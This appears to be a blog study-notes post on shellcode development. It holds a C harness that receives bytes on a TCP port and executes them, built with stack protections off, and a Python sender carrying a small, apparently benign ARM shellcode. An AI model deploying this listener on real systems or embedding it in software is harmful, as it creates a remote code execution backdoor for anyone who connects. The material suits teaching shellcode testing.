title: "shellcode远程调用"
date: 2014-03-17 16:29:54
tags:
id: 570
comment: false
categories:
  - 学习笔记
---

<pre class="brush:cpp">/*
  RemoteShellcodeLauncher.c 
	Author: Vivek Ramachandran
	Email: vivek@securitytube.net 

	License: Use as you please for both commercial/non-commercial with/without attribution 

	Website: http://securitytube.net 

	Infosec Training: http://SecurityTube-Training.com 
	Checkout our Assembly Language and Shellcoding course! 

	Disclaimer: Written in 30 mins by salvaging my old code, might be prone to error. Please fix yourself :)

	Compile: gcc RemoteShellcodeLauncher.c -z execstack -fno-stack-protector -o RemoteShellcodeLauncher

*/

#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;sys/socket.h&gt;
#include&lt;sys/types.h&gt;
#include&lt;strings.h&gt;
#include&lt;unistd.h&gt;
#include&lt;string.h&gt;
#include&lt;arpa/inet.h&gt;

#define ERROR	-1
#define MAX_DATA	2048	
#define MAX_SHELLCODE_LEN	4096

char shellcode[MAX_SHELLCODE_LEN];

main(int argc, char **argv)
{
	struct sockaddr_in server;
	struct sockaddr_in client;
	int sock;
	int new;
	int sockaddr_len = sizeof(struct sockaddr_in);
	int data_len, shellcode_len;
	char data[MAX_DATA];
	int (*fptr)();

	if((sock = socket(AF_INET, SOCK_STREAM, 0)) == ERROR)
	{
		perror("server socket: ");
		exit(-1);
	}

	server.sin_family = AF_INET;
	server.sin_port = htons(atoi(argv[1]));
	server.sin_addr.s_addr = INADDR_ANY;
	bzero(&amp;server.sin_zero, 8);

	if((bind(sock, (struct sockaddr *)&amp;server, sockaddr_len)) == ERROR)
	{
		perror("bind : ");
		exit(-1);
	}

	if((listen(sock, 1)) == ERROR)
	{
		perror("listen");
		exit(-1);
	}

	if((new = accept(sock, (struct sockaddr *)&amp;client, &amp;sockaddr_len)) == ERROR)
	{
		perror("accept");
		exit(-1);
	}

	data_len = shellcode_len = 0;

	do
	{
		data_len = recv(new, data, MAX_DATA, 0);

		if(data_len)
		{
			memcpy(&amp;shellcode[shellcode_len], data, data_len);
			shellcode_len += data_len;
			if (shellcode_len &gt; MAX_SHELLCODE_LEN)
			{
				printf("Received shellcode length exceeds MAX_SHELLCODE_LEN: exiting!\n");
				exit(-1);
			}

		}

	}while(data_len);

	close(new);
	close(sock);

	if(shellcode_len)
	{

		printf("Shellcode size: %d\n", (int)strlen(shellcode));
		printf("Executing ...\n");
		fptr = (int(*)())shellcode;
		(int)(*fptr)();

	}

	return 0;		
}</pre>
<pre class="brush:py">#!/usr/bin/python
#demo.py

import sys, socket 

shellcode = ("\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x10\x22\x79\x46\x0e\x31\x01\x20\x04\x27\x01\xdf\x24\x1b\x20\x1c\x01\x27\x01\xdf\x73\x68\x65\x6c\x6c\x2d\x73\x74\x6f\x72\x6d\x2e\x6f\x72\x67\x0a")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)

sock.connect((sys.argv[1], int(sys.argv[2])))

sock.send(shellcode)

sock.close()

print "Shellcode of Len: %d sent!\n", len(shellcode)</pre>